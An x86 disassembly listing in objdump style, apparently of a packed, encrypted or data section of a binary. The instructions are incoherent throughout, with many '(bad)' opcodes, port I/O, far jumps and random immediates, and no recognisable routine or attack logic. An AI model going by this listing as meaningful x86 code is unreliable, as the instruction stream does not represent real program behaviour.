  41d5e7:	xor    DWORD PTR [edi],edi
  41d5e9:	das    
  41d5ea:	ja     0x41d58e
  41d5ec:	lds    ebx,FWORD PTR [ebp+0x16]
  41d5ef:	out    0x23,al
  41d5f1:	adc    ch,BYTE PTR [ebp+0x4e]
  41d5f4:	mov    edi,0x94683dbd
  41d5f9:	xchg   esi,eax
  41d5fa:	cmp    al,0x77
  41d5fc:	rol    ah,1
  41d5fe:	pop    eax
  41d5ff:	xor    eax,0x711850c9
  41d604:	sbb    al,0xf4
  41d606:	jns    0x41d5a6
  41d608:	mov    eax,ds:0xfd1b8b3f
  41d60d:	xchg   esi,eax
  41d60e:	sbb    BYTE PTR [eax-0x7e38d0d6],ah
  41d614:	jp     0x41d661
  41d616:	dec    edx
  41d617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d618:	pop    edx
  41d619:	and    al,0x5e
  41d61b:	inc    ecx
  41d61c:	jp     0x41d5cc
  41d61e:	in     eax,0x1
  41d620:	mov    esp,0x8efb266c
  41d625:	sub    BYTE PTR [edx],dh
  41d627:	ja     0x41d632
  41d629:	or     cl,BYTE PTR [edx]
  41d62b:	gs cmp eax,0xcc87538b
  41d631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d632:	adc    BYTE PTR [ebx+0x5a284656],bh
  41d638:	out    dx,eax
  41d639:	sahf   
  41d63a:	icebp  
  41d63b:	xchg   DWORD PTR [ebx-0x220fe433],esp
  41d641:	icebp  
  41d642:	dec    edi
  41d643:	stc    
  41d644:	not    DWORD PTR [ebx+0x7f]
  41d647:	dec    ebp
  41d648:	out    dx,al
  41d649:	mov    ds:0x5d2b24d6,eax
  41d64e:	and    BYTE PTR ds:[ecx+0x36],0x90
  41d653:	sbb    DWORD PTR [ecx+0x76f9408],0xbfcf0897
  41d65d:	ins    DWORD PTR es:[edi],dx
  41d65e:	add    DWORD PTR [ebx],esi
  41d660:	push   edx
  41d661:	retf   0xba7c
  41d664:	into   
  41d665:	ins    BYTE PTR es:[edi],dx
  41d666:	ss mov bh,0x8a
  41d669:	pop    edi
  41d66a:	fldcw  WORD PTR [esi+esi*4]
  41d66d:	mov    dh,0x7d
  41d66f:	and    ecx,esi
  41d671:	repnz jmp 0x1fc8:0xac6967ea
  41d679:	enter  0x2e8d,0xfd
  41d67d:	dec    edx
  41d67e:	enter  0x42ba,0x6e
  41d682:	xchg   edx,eax
  41d683:	jnp    0x41d6c4
  41d685:	stos   BYTE PTR es:[edi],al
  41d686:	test   BYTE PTR [edi+0x35ab976e],ah
  41d68c:	in     eax,0xf5
  41d68e:	das    
  41d68f:	mov    ebx,0xe3c94690
  41d694:	push   edx
  41d695:	ins    DWORD PTR es:[edi],dx
  41d696:	rcl    BYTE PTR [edx+0x68],1
  41d699:	(bad)  
  41d69b:	push   0xfffffffa
  41d69d:	sub    edx,ecx
  41d69f:	loop   0x41d62b
  41d6a1:	xchg   BYTE PTR [ecx-0x31e7799a],bl
  41d6a7:	fdiv   st,st(3)
  41d6a9:	adc    eax,DWORD PTR [esi+0x40]
  41d6ac:	aam    0x9
  41d6ae:	loopne 0x41d6e8
  41d6b0:	sbb    al,BYTE PTR [edx+0x65c30c08]
  41d6b6:	dec    esp
  41d6b7:	(bad)  
  41d6b8:	jg     0x41d66e
  41d6ba:	pushf  
  41d6bb:	mov    al,0xd7
  41d6bd:	test   DWORD PTR [ebp-0x46],0x267ee53c
  41d6c4:	or     BYTE PTR [esi],0xcf
  41d6c7:	push   cs
  41d6c8:	push   esi
  41d6c9:	icebp  
  41d6ca:	cli    
  41d6cb:	cld    
  41d6cc:	add    esi,eax
  41d6ce:	out    dx,eax
  41d6cf:	push   0x31da6871
  41d6d4:	xor    cl,bh
  41d6d6:	fistp  QWORD PTR [ecx-0x79035257]
  41d6dc:	cld    
  41d6dd:	pop    esp
  41d6de:	mov    DWORD PTR [edx],ebp
  41d6e0:	ror    BYTE PTR [ebp-0x32],1
  41d6e3:	std    
  41d6e4:	call   0xb720ff86
  41d6e9:	mov    ecx,DWORD PTR [edi]
  41d6eb:	cmc    
  41d6ec:	hlt    
  41d6ed:	pusha  
  41d6ee:	xor    BYTE PTR [eax-0x7c21dc6f],al
  41d6f4:	or     BYTE PTR [eax],dl
  41d6f6:	or     esp,DWORD PTR [edx-0x41fb5193]
  41d6fc:	mov    ecx,0x7ce4893a
  41d701:	cmc    
  41d702:	call   0x4784:0xd613ec98
  41d709:	les    esp,FWORD PTR [ecx+0x364b54af]
  41d70f:	xlat   BYTE PTR ds:[ebx]
  41d710:	cmp    esi,ebx
  41d712:	cwde   
  41d713:	add    edx,DWORD PTR [edi+0x5ea6bd6e]
  41d719:	xlat   BYTE PTR ds:[ebx]
  41d71a:	push   edx
  41d71b:	jb     0x41d6e3
  41d71d:	pop    eax
  41d71e:	loope  0x41d72a
  41d720:	add    ebx,eax
  41d722:	adc    esi,eax
  41d724:	mov    dl,0x2f
  41d726:	lods   eax,DWORD PTR ds:[esi]
  41d727:	jno    0x41d6d3
  41d729:	rol    DWORD PTR [eax+0x1e8f66d],cl
  41d72f:	into   
  41d730:	inc    esi
  41d731:	sbb    eax,DWORD PTR [ebx-0x2f1dc12]
  41d737:	add    BYTE PTR [eax-0x77f0479a],bl
  41d73d:	inc    esi
  41d73e:	sub    ebx,ebx
  41d740:	sub    ebp,esi
  41d742:	daa    
  41d743:	fstp   DWORD PTR [esi-0x12]
  41d746:	imul   edi,DWORD PTR [ebx+0x4c5d6bd0],0xffffff91
  41d74d:	cmc    
  41d74e:	(bad)  
  41d74f:	pop    ecx
  41d750:	retf   
  41d751:	mov    ch,0x98
  41d753:	or     eax,0xcd2cf696
  41d758:	out    dx,al
  41d759:	fsubr  DWORD PTR [edx]
  41d75b:	mov    edi,0x259dbb95
  41d760:	pop    ds
  41d761:	xchg   ecx,eax
  41d762:	(bad)  
  41d764:	jl     0x41d6fd
  41d766:	xchg   ebp,eax
  41d767:	(bad)  
  41d768:	jnp    0x41d70c
  41d76a:	mov    ebx,0x2b61eb0c
  41d76f:	adc    esi,DWORD PTR [ecx+0x23b260c7]
  41d775:	sahf   
  41d776:	mov    ebp,0x70487d92
  41d77b:	cs add eax,0x7b1f9436
  41d781:	and    esi,DWORD PTR [esi]
  41d783:	mov    ch,BYTE PTR [edx-0x1b3ce8f6]
  41d789:	mov    eax,0x8077e72f
  41d78e:	cmc    
  41d78f:	jge    0x41d7df
  41d791:	lea    edx,[edx+0x5f02e3f0]
  41d797:	mov    ebp,0xdc3e85ad
  41d79c:	scas   eax,DWORD PTR es:[edi]
  41d79d:	adc    cl,dh
  41d79f:	fidiv  WORD PTR [ecx]
  41d7a1:	ret    0xa0b3
  41d7a4:	push   esp
  41d7a5:	bnd js 0x41d7a1
  41d7a8:	ins    BYTE PTR es:[edi],dx
  41d7a9:	sbb    BYTE PTR [ebp-0x248c0ce7],0xec
  41d7b0:	jae    0x41d78c
  41d7b2:	push   cs
  41d7b3:	or     al,0x34
  41d7b5:	adc    dl,BYTE PTR [eax-0x5b9c6067]
  41d7bb:	scas   eax,DWORD PTR es:[edi]
  41d7bc:	push   esi
  41d7bd:	in     eax,0xd1
  41d7bf:	pop    esi
  41d7c0:	out    dx,al
  41d7c1:	sbb    dl,al
  41d7c3:	adc    cl,BYTE PTR [ebp+ebx*2-0x712c99d4]
  41d7ca:	mov    ecx,0x1d727d3b
  41d7cf:	xor    eax,DWORD PTR [eax-0x59]
  41d7d2:	and    BYTE PTR [eax+0x4c],ch
  41d7d5:	fs jmp 0x6471e821
  41d7db:	sti    
  41d7dc:	loopne 0x41d7fa
  41d7de:	retf   
  41d7df:	mov    ds:0xb75dff94,al
  41d7e4:	push   esp
  41d7e5:	leave  
  41d7e6:	test   al,0x87
  41d7e8:	ficom  DWORD PTR [esi+0x4b]
  41d7eb:	xor    eax,0xad9e3de6
  41d7f0:	fsub   DWORD PTR [ebp-0x40]
  41d7f3:	imul   BYTE PTR [edx+0x524818d8]
  41d7f9:	push   es
  41d7fa:	sti    
  41d7fb:	dec    eax
  41d7fc:	scas   eax,DWORD PTR es:[edi]
  41d7fd:	dec    eax
  41d7fe:	dec    edx
  41d7ff:	xor    edi,DWORD PTR [esi-0x49c130e2]
  41d805:	lahf   
  41d806:	lds    ebx,FWORD PTR [edi+0x7a]
  41d809:	push   ds
  41d80a:	mov    ds:0x4cca7445,al
  41d80f:	into   
  41d810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d811:	das    
  41d812:	or     bl,ah
  41d814:	test   BYTE PTR [ebx+edi*1-0x6602fe06],cl
  41d81b:	daa    
  41d81c:	push   ds
  41d81d:	mov    ecx,0xcebbb37c
  41d822:	xor    bl,BYTE PTR [edi]
  41d824:	shr    BYTE PTR [ebx+0x4a],cl
  41d827:	mov    edx,0xc65b803a
  41d82c:	lds    ecx,FWORD PTR [ebx+0x23]
  41d82f:	repz cld 
  41d831:	scas   eax,DWORD PTR es:[edi]
  41d832:	and    eax,0x43bc9efd
  41d837:	and    al,0x59
  41d839:	pusha  
  41d83a:	lods   eax,DWORD PTR ss:[esi]
  41d83c:	repnz mov esp,ss
  41d83f:	fcom   st(4)
  41d841:	pop    ecx
  41d842:	out    dx,eax
  41d843:	mov    ebp,0xec0bc5fb
  41d848:	inc    esi
  41d849:	loope  0x41d821
  41d84b:	ja     0x41d81f
  41d84d:	xlat   BYTE PTR ds:[ebx]
  41d84e:	fistp  WORD PTR [ebx*4+0x4d93b77f]
  41d855:	scas   eax,DWORD PTR es:[edi]
  41d856:	(bad)  
  41d857:	cmp    eax,ebx
  41d859:	loope  0x41d7ed
  41d85b:	jbe    0x41d860
  41d85d:	and    bh,dh
  41d85f:	mov    edi,0x9c3adc9a
  41d864:	or     DWORD PTR [ecx+0x1da99fc],edx
  41d86a:	(bad)  
  41d86c:	dec    ebx
  41d86d:	dec    ecx
  41d86e:	mov    esp,0xc6f55b
  41d873:	push   eax
  41d874:	mov    ecx,0x87f1d26b
  41d879:	add    DWORD PTR [eax-0x36d45dd4],0x7ee909b8
  41d883:	out    0x6c,eax
  41d885:	shl    DWORD PTR [ecx+ecx*8],cl
  41d888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d889:	clc    
  41d88a:	adc    eax,0xf8a7cf2e
  41d88f:	leave  
  41d890:	push   ss
  41d891:	pop    ecx
  41d892:	mov    ah,BYTE PTR [bp+si+0x55]
  41d896:	xor    al,0x8f
  41d898:	jns    0x41d8bc
  41d89a:	imul   edi,DWORD PTR [edi+0x24374ae6],0xffffffb2
  41d8a1:	add    eax,0x1ca4221
  41d8a6:	hlt    
  41d8a7:	jge    0x41d83d
  41d8a9:	shr    DWORD PTR [eax],1
  41d8ab:	xor    eax,0x130f0f51
  41d8b0:	leavew 
  41d8b2:	fist   WORD PTR ds:0x717111f0
  41d8b8:	sbb    al,0x7
  41d8ba:	leave  
  41d8bb:	dec    esp
  41d8bc:	xor    eax,0x260892e6
  41d8c1:	push   ebx
  41d8c2:	or     DWORD PTR [edx+0x51f5f9e3],esi
  41d8c8:	jmp    0x41d93c
  41d8ca:	mov    ds:0x58c3a2c2,al
  41d8cf:	add    eax,0x92497c23
  41d8d4:	and    BYTE PTR [ebp+0x78ddc2dc],bh
  41d8da:	outs   dx,DWORD PTR ds:[esi]
  41d8db:	pushf  
  41d8dc:	int    0x99
  41d8de:	sbb    esi,edi
  41d8e0:	adc    al,0xf3
  41d8e2:	rcl    BYTE PTR [eax],cl
  41d8e4:	pop    ebp
  41d8e5:	or     dl,bl
  41d8e7:	jmp    0x6a5ec5c4
  41d8ec:	or     bl,dl
  41d8ee:	hlt    
  41d8ef:	push   ebx
  41d8f0:	je     0x41d926
  41d8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8f3:	rol    eax,1
  41d8f5:	add    ah,BYTE PTR [ebx]
  41d8f7:	or     DWORD PTR [ecx-0x5e6ceee7],0x88cb407c
  41d901:	add    BYTE PTR [edx],0x76
  41d904:	(bad)  
  41d906:	aad    0xa6
  41d908:	add    al,0x3e
  41d90a:	pop    ecx
  41d90b:	jne    0x41d8dc
  41d90d:	js     0x41d8c7
  41d90f:	fwait
  41d910:	push   cs
  41d911:	sbb    dh,bh
  41d913:	mov    al,0x21
  41d915:	shl    BYTE PTR [ebx+edx*1],cl
  41d918:	sub    DWORD PTR [ecx+ecx*2-0x491f33f5],ebp
  41d91f:	dec    edi
  41d920:	and    DWORD PTR [eax-0x6a],edi
  41d923:	fld    QWORD PTR [ebx+0x710cea03]
  41d929:	rol    BYTE PTR [edi+ecx*2-0x33],cl
  41d92d:	dec    eax
  41d92e:	out    dx,eax
  41d92f:	push   edx
  41d930:	arpl   WORD PTR [eax+0x43],dx
  41d933:	and    BYTE PTR ds:0xa850c8c5,ch
  41d939:	outs   dx,DWORD PTR ds:[esi]
  41d93a:	shl    BYTE PTR [edx+ebp*2],0x5f
  41d93e:	mov    ah,0x6e
  41d940:	dec    ebp
  41d941:	mov    esi,0x363c8956
  41d946:	mov    ch,0x3
  41d948:	ret    
  41d949:	les    ebx,FWORD PTR [edi+0x5e]
  41d94c:	xchg   BYTE PTR [bx+di+0x78],ah
  41d950:	cmp    BYTE PTR [eax+0x52aee720],0x8b
  41d957:	or     al,0xdc
  41d959:	cwde   
  41d95a:	push   esp
  41d95b:	outs   dx,DWORD PTR ds:[esi]
  41d95c:	inc    esi
  41d95d:	lock int 0x53
  41d960:	lods   al,BYTE PTR ds:[esi]
  41d961:	mov    bl,0x59
  41d963:	(bad)  
  41d964:	sub    DWORD PTR [eax-0x17],edx
  41d967:	rol    DWORD PTR [ebx+0x6537a831],cl
  41d96d:	in     eax,0xf9
  41d96f:	cmp    dh,dl
  41d971:	mov    ebx,0x7be7f4eb
  41d976:	cli    
  41d977:	ja     0x41d8fa
  41d979:	pop    ebp
  41d97a:	mov    dh,0x26
  41d97c:	ss push es
  41d97e:	mov    al,0x8a
  41d980:	call   0x2842:0x829f1802
  41d987:	jns    0x41d9e7
  41d989:	leave  
  41d98a:	cmp    bl,BYTE PTR [ebx+0x5cd2c4e7]
  41d990:	xor    BYTE PTR [esi+0x238c0ccd],bh
  41d996:	fadd   st(2),st
  41d998:	pop    gs
  41d99a:	(bad)
  41d99d:	add    eax,DWORD PTR [ebx+0x6bff99e5]
  41d9a3:	jne    0x41d93f
  41d9a5:	ret    
  41d9a6:	jae    0x41da12
  41d9a8:	inc    ecx
  41d9a9:	inc    edi
  41d9aa:	pop    eax
  41d9ab:	pop    es
  41d9ac:	std    
  41d9ad:	adc    edi,DWORD PTR [ebx-0x6b215a18]
  41d9b3:	repnz (bad) 
  41d9b5:	mov    ds:0x631cf337,al
  41d9ba:	popa   
  41d9bb:	nop
  41d9bc:	out    dx,eax
  41d9bd:	inc    esi
  41d9be:	add    bl,BYTE PTR [ebx-0x2807e6fc]
  41d9c4:	adc    DWORD PTR [edx-0x4b094ef2],ebx
  41d9ca:	xor    bh,BYTE PTR [ecx+0x27]
  41d9cd:	(bad)  
  41d9ce:	popf   
  41d9cf:	adc    eax,0x7dbd734f
  41d9d4:	pushw  ss
  41d9d6:	addr16 js 0x41d96e
  41d9d9:	xchg   edx,esp
  41d9db:	jmp    0x41da0e
  41d9dd:	sbb    BYTE PTR [ebx-0x621e69b8],0x30
  41d9e4:	adc    edx,DWORD PTR [edi+edx*4]
  41d9e7:	ins    BYTE PTR es:[edi],dx
  41d9e8:	inc    edi
  41d9e9:	add    al,0xda
  41d9eb:	fs xchg esp,eax
  41d9ed:	xchg   esp,eax
  41d9ee:	pusha  
  41d9ef:	lock sbb edx,eax
  41d9f2:	cwde   
  41d9f3:	jo     0x41da68
  41d9f5:	and    eax,0x1e3eb344
  41d9fa:	les    ebx,FWORD PTR [ebp+0x316d3404]
  41da00:	cmp    esp,ebx
  41da02:	pop    esp
  41da03:	push   0x814f3ec
  41da08:	out    0x4f,eax
  41da0a:	jecxz  0x41da6e
  41da0c:	add    dl,dh
  41da0e:	loope  0x41d9f8
  41da10:	pop    ebx
  41da11:	mov    dh,BYTE PTR [edi]
  41da13:	repnz add esp,eax
  41da16:	mov    bl,0xa8
  41da18:	pushf  
  41da19:	data16 jo 0x41d9d4
  41da1c:	xlat   BYTE PTR ds:[ebx]
  41da1d:	mov    dh,cl
  41da1f:	dec    edx
  41da20:	shl    esp,0x68
  41da23:	cdq    
  41da24:	push   cs
  41da25:	aas    
  41da26:	call   0x772b:0xc76cd783
  41da2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da2e:	xor    al,0xc8
  41da30:	imul   edx,DWORD PTR [edi],0x5271c6bd
  41da36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da37:	into   
  41da38:	rol    DWORD PTR [esi+edi*4+0x45102ed4],cl
  41da3f:	push   edi
  41da40:	adc    al,0x28
  41da42:	push   ecx
  41da43:	mov    ebp,fs
  41da45:	dec    edx
  41da46:	sti    
  41da47:	jno    0x41da92
  41da49:	push   0xc
  41da4b:	and    eax,0x8bf19785
  41da50:	xor    ah,bl
  41da52:	out    dx,eax
  41da53:	inc    ebp
  41da54:	enter  0xc1,0xbf
  41da58:	push   ebx
  41da59:	pop    ds
  41da5a:	(bad)  
  41da5b:	stc    
  41da5c:	sbb    BYTE PTR [eax+0x2],ch
  41da5f:	mov    ecx,DWORD PTR [eax]
  41da61:	push   0x3e
  41da63:	out    0xb8,eax
  41da65:	mov    esp,0xb2e575a8
  41da6a:	xchg   esi,eax
  41da6b:	jbe    0x41da90
  41da6d:	adc    BYTE PTR [eax+0x76709fe1],0x16
  41da74:	mov    dh,0xd9
  41da76:	les    ebp,FWORD PTR [edi]
  41da78:	sbb    BYTE PTR [eax],cl
  41da7a:	cli    
  41da7b:	in     eax,dx
  41da7c:	push   esp
  41da7d:	jg     0x41da9c
  41da7f:	dec    esp
  41da80:	rcl    bh,0xd3
  41da83:	cwde   
  41da84:	jns    0x41da32
  41da86:	add    DWORD PTR [eax],0x6
  41da89:	cmp    edi,DWORD PTR [edi+0x11ae4baf]
  41da8f:	jg     0x41dae5
  41da91:	sbb    edx,DWORD PTR [esi-0x72]
  41da94:	test   BYTE PTR ds:0xb11225c6,ah
  41da9a:	jne    0x41da26
  41da9c:	ret    0x487
  41da9f:	das    
  41daa0:	cmp    ebx,DWORD PTR [esi+eax*1]
  41daa3:	mov    edi,0x2f60c928
  41daa8:	xchg   ebp,eax
  41daa9:	push   esi
  41daaa:	and    eax,0x88652252
  41daaf:	repz add DWORD PTR [ebp-0x68],ebp
  41dab3:	adc    edx,DWORD PTR ds:0x27a66d21
  41dab9:	lea    ebp,[ebx]
  41dabb:	ja     0x41db33
  41dabd:	ss cwde 
  41dabf:	test   BYTE PTR [eax+0x79],ah
  41dac2:	repnz adc ebx,DWORD PTR [esi+edx*4]
  41dac6:	inc    ebx
  41dac7:	jns    0x41daf7
  41dac9:	push   edi
  41daca:	mov    cs,WORD PTR [ebx+esi*8]
  41dacd:	inc    edi
  41dace:	push   ebx
  41dacf:	aaa    
  41dad0:	sahf   
  41dad1:	xchg   DWORD PTR [esi+0x4abcbd6e],edi
  41dad7:	sub    eax,ebx
  41dad9:	arpl   sp,di
  41dadb:	cmp    al,0x60
  41dadd:	xlat   BYTE PTR ds:[ebx]
  41dade:	sub    eax,0xe796a0ea
  41dae3:	mov    al,ds:0x691c894d
  41dae8:	or     DWORD PTR [eax-0x591a2462],edx
  41daee:	icebp  
  41daef:	fist   WORD PTR ds:0xc8376aa4
  41daf5:	cmp    esp,DWORD PTR ds:0x665074b8
  41dafb:	ja     0x41daf6
  41dafd:	jo     0x41daa3
  41daff:	stos   BYTE PTR es:[edi],al
  41db00:	mov    cl,BYTE PTR [edx]
  41db02:	mul    BYTE PTR [esi]
  41db04:	push   eax
  41db05:	rcl    BYTE PTR [edx+0x2b],0xf5
  41db09:	inc    edx
  41db0a:	or     eax,0x358119ef
  41db0f:	sub    BYTE PTR [edi-0x59],ch
  41db12:	rcl    BYTE PTR [ecx+0x31],1
  41db15:	ins    DWORD PTR es:[edi],dx
  41db16:	xor    edx,esp
  41db18:	push   ss
  41db19:	and    DWORD PTR [eax+0x3a332ee6],esp
  41db1f:	or     ah,al
  41db21:	or     DWORD PTR [eax-0x40],edx
  41db24:	cs push eax
  41db26:	repz sbb BYTE PTR [ebp+0x579bc6be],0x72
  41db2e:	ror    BYTE PTR [edi],0x2b
  41db31:	xchg   esp,eax
  41db32:	xchg   BYTE PTR [eax],ch
  41db34:	rol    BYTE PTR [ecx],1
  41db36:	popa   
  41db37:	and    al,0x2f
  41db39:	jp     0x41dac5
  41db3b:	xchg   ebx,eax
  41db3c:	jns    0x41daea
  41db3e:	ins    DWORD PTR es:[edi],dx
  41db3f:	jbe    0x41db48
  41db41:	mov    edx,0x4dd1df2b
  41db46:	xor    DWORD PTR [edi+0x44],edi
  41db49:	pop    ecx
  41db4a:	fld    st(0)
  41db4c:	or     DWORD PTR [ebp-0x200797c6],eax
  41db52:	neg    ecx
  41db54:	scas   eax,DWORD PTR es:[edi]
  41db55:	lahf   
  41db56:	xor    eax,esi
  41db58:	repz enter 0xbc26,0x54
  41db5d:	(bad)  
  41db5e:	loopne 0x41db04
  41db60:	xor    ebp,esp
  41db62:	sti    
  41db63:	xchg   ebp,eax
  41db64:	int3   
  41db65:	bound  ebx,QWORD PTR [ebp+0x70d528e4]
  41db6b:	ins    BYTE PTR es:[edi],dx
  41db6c:	cwde   
  41db6d:	sub    edi,esi
  41db6f:	pop    ds
  41db70:	push   edx
  41db71:	xlat   BYTE PTR ds:[ebx]
  41db72:	or     BYTE PTR [edi],cl
  41db74:	enter  0x7690,0x82
  41db78:	psllq  mm1,QWORD PTR [esi+edi*8-0x20]
  41db7d:	dec    BYTE PTR [edi+0x32]
  41db80:	(bad)  
  41db81:	dec    esp
  41db82:	jmp    0xcfd91445
  41db87:	test   DWORD PTR [ecx-0x53],esi
  41db8a:	mov    bh,ch
  41db8c:	jmp    0x41db78
  41db8e:	jno    0x41dbfe
  41db90:	lds    edi,FWORD PTR ds:0x176e539e
  41db96:	dec    esi
  41db97:	arpl   WORD PTR [edx-0xdba51cf],sp
  41db9d:	or     BYTE PTR [esp+edx*4-0x3622032a],0x9e
  41dba5:	push   ss
  41dba6:	les    edi,FWORD PTR [ecx+0x9bbf87b]
  41dbac:	push   cs
  41dbad:	push   eax
  41dbae:	stos   DWORD PTR es:[edi],eax
  41dbaf:	arpl   WORD PTR [ebx-0x1e],si
  41dbb2:	test   eax,0x19185db9
  41dbb7:	xor    DWORD PTR [esi-0x2223ab8a],esp
  41dbbd:	out    dx,eax
  41dbbe:	inc    ebp
  41dbbf:	fs mov ah,0x8b
  41dbc2:	pop    edx
  41dbc3:	loope  0x41db4e
  41dbc5:	mov    eax,ds:0x9b596e05
  41dbca:	mov    al,ds:0xa0957654
  41dbcf:	daa    
  41dbd0:	jns    0x41dbb2
  41dbd2:	push   ss
  41dbd3:	dec    eax
  41dbd4:	das    
  41dbd5:	rol    BYTE PTR [esi+0x64],1
  41dbd8:	ds call 0x9662:0xf51a95b4
  41dbe0:	mov    eax,ds:0x1f0f1a27
  41dbe5:	lea    ecx,[eax-0x3b]
  41dbe8:	(bad)  
  41dbe9:	adc    DWORD PTR [edi],ecx
  41dbeb:	mov    edx,0xb887b4db
  41dbf0:	cmp    BYTE PTR [edi-0x7ce3c308],0x2d
  41dbf7:	pop    ecx
  41dbf8:	(bad)  
  41dbf9:	dec    edi
  41dbfa:	xor    edi,DWORD PTR [eax-0x8bf9beb]
  41dc00:	imul   ecx,DWORD PTR [edi+ebx*4],0x9661e21d
  41dc07:	(bad)  
  41dc08:	in     al,0x32
  41dc0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc0b:	cmp    eax,DWORD PTR [ecx-0x52]
  41dc0e:	push   edi
  41dc0f:	cmp    ecx,DWORD PTR [edx-0x74]
  41dc12:	ror    ecx,1
  41dc14:	setle  BYTE PTR [ebx+0x5f5c8318]
  41dc1b:	aaa    
  41dc1c:	test   al,0x7e
  41dc1e:	lds    ebx,FWORD PTR [ebx-0x55]
  41dc21:	add    eax,0x97510521
  41dc26:	xor    al,0xe9
  41dc28:	mov    al,0x16
  41dc2a:	sbb    esp,DWORD PTR [ecx+0x75]
  41dc2d:	dec    edi
  41dc2e:	dec    edx
  41dc2f:	sub    DWORD PTR [esi+0x2364e239],esi
  41dc35:	sahf   
  41dc36:	sti    
  41dc37:	sbb    BYTE PTR [esi],dh
  41dc39:	pop    ebp
  41dc3a:	fldln2 
  41dc3c:	loop   0x41dca9
  41dc3e:	pop    edx
  41dc3f:	mov    bl,0x85
  41dc41:	add    esi,DWORD PTR [esi]
  41dc43:	jle    0x41dc03
  41dc45:	int    0x78
  41dc47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc48:	inc    eax
  41dc49:	inc    eax
  41dc4a:	(bad)  
  41dc4b:	mov    bx,0x7099
  41dc4f:	imul   ebx,DWORD PTR cs:[edx-0x26a37f3f],0x44abd911
  41dc5a:	test   DWORD PTR [eax-0x692cfce1],ebp
  41dc60:	lahf   
  41dc61:	push   ecx
  41dc62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc63:	arpl   ax,sp
  41dc65:	dec    ebx
  41dc66:	mov    edx,0x8accbd7
  41dc6b:	(bad)  
  41dc6c:	jp     0x41dcac
  41dc6e:	and    eax,ebp
  41dc70:	lahf   
  41dc71:	lock mov eax,0xfd094076
  41dc77:	mov    eax,ds:0x85997809
  41dc7c:	in     al,dx
  41dc7d:	mov    es,WORD PTR [ebp-0x44]
  41dc80:	pop    esi
  41dc81:	pop    edi
  41dc82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc83:	jno    0x41dc9a
  41dc85:	mov    esi,0x1c2ebf4d
  41dc8a:	cmp    esp,ebx
  41dc8c:	pop    ebp
  41dc8d:	out    dx,eax
  41dc8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc8f:	jp     0x41dcd3
  41dc91:	clc    
  41dc92:	xor    BYTE PTR [ecx],bl
  41dc94:	jno    0x41dcb6
  41dc96:	inc    edi
  41dc97:	xchg   bl,ah
  41dc99:	xor    cl,BYTE PTR [eax+0x25a0531f]
  41dc9f:	jg     0x41dc6f
  41dca1:	dec    ecx
  41dca2:	call   DWORD PTR [esi+0x40]
  41dca5:	dec    esp
  41dca6:	sub    ch,BYTE PTR [edi-0x47]
  41dca9:	jecxz  0x41dd1c
  41dcab:	cmp    ah,BYTE PTR [ecx+0x26d419e4]
  41dcb1:	aad    0xdb
  41dcb3:	int3   
  41dcb4:	test   DWORD PTR [esi+0x5f],ecx
  41dcb7:	int3   
  41dcb8:	xor    DWORD PTR [ecx+0x43],edi
  41dcbb:	popa   
  41dcbc:	pop    ebp
  41dcbd:	mov    dh,0x21
  41dcbf:	ja     0x41dcca
  41dcc1:	cmp    al,0x61
  41dcc3:	xor    bl,dh
  41dcc5:	and    esp,DWORD PTR [eax-0x7a]
  41dcc8:	repnz cld 
  41dcca:	lea    esi,[ecx+ebx*2-0x78]
  41dcce:	inc    edx
  41dccf:	or     ebp,ebx
  41dcd1:	pop    eax
  41dcd2:	jge    0x41dcb2
  41dcd4:	(bad)  
  41dcd6:	sub    al,0x3e
  41dcd8:	sti    
  41dcd9:	lea    edi,[eax+0x78]
  41dcdc:	pop    edi
  41dcdd:	xlat   BYTE PTR ds:[ebx]
  41dcde:	ret    
  41dcdf:	cmp    DWORD PTR cs:[esi+0x230583ed],esi
  41dce6:	int3   
  41dce7:	loop   0x41dd45
  41dce9:	je     0x41dc76
  41dceb:	(bad)  
  41dced:	fisttp DWORD PTR [ecx-0x31821b04]
  41dcf3:	adc    ah,BYTE PTR [ebp+0x4f]
  41dcf6:	call   0xdfc1:0x237b2820
  41dcfd:	xor    BYTE PTR gs:[edx+edi*8],al
  41dd01:	out    0xbc,eax
  41dd03:	pop    esi
  41dd04:	jmp    0x41dd71
  41dd06:	adc    edi,esi
  41dd08:	xor    al,0x4a
  41dd0a:	mov    ds:0xc36ebcd7,eax
  41dd0f:	neg    BYTE PTR [ecx]
  41dd11:	dec    edx
  41dd12:	fs pop edx
  41dd14:	bound  ecx,QWORD PTR [ecx]
  41dd16:	mov    esi,0x56d61f22
  41dd1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd1c:	fadd   DWORD PTR [edx+eax*4+0x759c6c7d]
  41dd23:	cmp    al,0xac
  41dd25:	out    dx,al
  41dd26:	push   esi
  41dd27:	popf   
  41dd28:	cmp    al,0x9f
  41dd2a:	mov    bh,0x8
  41dd2c:	mov    eax,ds:0x92279972
  41dd31:	sbb    dh,BYTE PTR ds:[esi-0x1e]
  41dd35:	test   eax,0x7043fbce
  41dd3a:	dec    ebx
  41dd3b:	sub    eax,0xe18fb474
  41dd40:	ror    dl,1
  41dd42:	arpl   WORD PTR [edi+ebx*1+0x152ba4de],sp
  41dd49:	outs   dx,BYTE PTR ds:[esi]
  41dd4a:	sahf   
  41dd4b:	adc    DWORD PTR [edx],0x5d
  41dd4e:	ins    BYTE PTR es:[edi],dx
  41dd4f:	mov    eax,ds:0x5e261c41
  41dd54:	cwde   
  41dd55:	mov    es,WORD PTR ds:[edi]
  41dd58:	adc    eax,0x5926f07a
  41dd5d:	cli    
  41dd5e:	pusha  
  41dd5f:	js     0x41dde0
  41dd61:	imul   edx,eax,0xffffffe7
  41dd64:	or     DWORD PTR [ebx],ecx
  41dd66:	pushf  
  41dd67:	inc    ebp
  41dd68:	sub    DWORD PTR [esi-0x15751b10],edi
